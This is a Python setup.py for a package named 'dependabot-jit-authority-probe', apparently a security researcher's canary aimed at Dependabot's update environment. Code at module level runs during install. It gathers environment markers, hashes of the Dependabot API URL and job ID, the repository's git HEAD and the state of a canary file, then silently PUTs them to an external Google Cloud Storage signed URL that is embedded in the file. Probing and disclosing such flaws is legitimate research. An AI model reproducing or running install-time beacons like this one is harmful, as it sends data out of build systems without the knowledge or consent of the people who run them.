import hashlib
import json
import os
import pathlib
import subprocess
import urllib.request
from datetime import datetime, timezone

from setuptools import find_packages, setup


RECEIPT_URL = "https://treborlab-dependabot-jit-receipts-1097452703518.storage.googleapis.com/pr-admission-stage1-20261103.json?x-goog-signature=531d47698fb3ecb050bbfe13aa619b91216b2d68f47cb6dc95e69948c596ac3faa46a80b6041c21d6f332e4754777030907dd7ec3124ad5246f7f9952b9b830fb95a068b3adfcf7277b02c423bf796b23f0c4dcce171695106045943f80b15fd4ce80df00eb400965d44422c29956533fb95e29f40465da7cecb776742601a0a8b1875a2173f8e7b9aed30043f5b0c5632e01b67b3c6c61e441a86fe7b36691582006d1a7c2787737db01e37ecd34f0bb99a66b5e456c2277c0f74e614dc6602b670abf690709efd3dafe7023cdd0c1753c62ef73e6d02d90d479ff62cdc50c2183b3efa3578eb8d62b4d3b868a707b6bef9d3f3932b5a21307b9374c140cdd3&x-goog-algorithm=GOOG4-RSA-SHA256&x-goog-credential=1097452703518-compute%40developer.gserviceaccount.com%2F20261103%2Fus-central1%2Fstorage%2Fgoog4_request&x-goog-date=20261103T065352Z&x-goog-expires=43200&x-goog-signedheaders=content-type%3Bhost"
CANARY_TEXT = b"Reporter-owned workflow-free Dependabot PR admission canary.\n"


def _sha256(value):
    return hashlib.sha256(value).hexdigest()


def _git_head(directory):
    try:
        result = subprocess.run(
            ["git", "-C", str(directory), "rev-parse", "HEAD"],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=5,
        )
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception:
        return None


def _emit_receipt():
    api_url = os.environ.get("DEPENDABOT_API_URL", "").rstrip("/")
    job_id = os.environ.get("DEPENDABOT_JOB_ID", "")
    repo_dir = pathlib.Path("/home/dependabot/dependabot-updater/repo")
    canary = repo_dir / "PR_ADMISSION_STAGE1.txt"
    canary_matches = False
    if canary.is_file():
        try:
            canary_matches = canary.read_bytes() == CANARY_TEXT
        except OSError:
            pass

    receipt = {
        "schema": "dependabot-pr-admission-stage1-v1",
        "observed_at": datetime.now(timezone.utc).isoformat(),
        "dependabot_marker": bool(os.environ.get("DEPENDABOT")),
        "dependabot_api_present": bool(api_url),
        "dependabot_job_present": bool(job_id),
        "api_origin_sha256": _sha256(api_url.split("/update_jobs/")[0].encode()) if api_url else None,
        "job_id_sha256": _sha256(job_id.encode()) if job_id else None,
        "github_actions": bool(os.environ.get("GITHUB_ACTIONS")),
        "repo_head": _git_head(repo_dir) if repo_dir.is_dir() else None,
        "stage1_canary_matches": canary_matches,
        "stage1_canary_sha256": _sha256(CANARY_TEXT),
    }
    body = (json.dumps(receipt, sort_keys=True) + "\n").encode()
    request = urllib.request.Request(
        RECEIPT_URL,
        data=body,
        headers={"Content-Type": "application/json"},
        method="PUT",
    )
    try:
        urllib.request.urlopen(request, timeout=15).read(1)
    except Exception:
        pass


_emit_receipt()

setup(
    name="dependabot-jit-authority-probe",
    version="0.0.10",
    description="Reporter-owned workflow-free Dependabot PR admission canary",
    packages=find_packages(),
)
